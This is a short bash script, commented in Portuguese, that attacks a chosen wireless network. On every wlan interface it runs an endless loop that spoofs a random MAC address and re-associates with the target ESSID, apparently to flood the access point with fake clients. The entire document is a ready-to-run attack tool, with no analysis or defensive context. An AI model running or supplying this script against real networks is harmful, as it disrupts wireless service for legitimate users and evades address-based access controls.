#!/bin/bash

ataque(){
	while true; do
		ifconfig $1 down;
		primeiro=` echo "obase=16;" $(( ( RANDOM % 255 )  + 1 )) | bc`
		segundo=` echo "obase=16;" $(( ( RANDOM % 255 )  + 1 )) | bc`
		terceiro=` echo "obase=16;" $(( ( RANDOM % 255 )  + 1 )) | bc`
		ifconfig $1 hw ether 00:16:3e:$primeiro:$segundo:$terceiro;
		ifconfig $1 up;
		sleep 1
		iwconfig $1 essid $2 ;
	done
}
# funcao main
echo "ESSID para ataque!"
read essid

# iniciando ataque pela interface para o essid
cd /proc/net/dev_snmp6/
for i in $(ls wlan* )
do
	ataque $i $essid &	
done

cd -
# aguarda processos filhos
wait
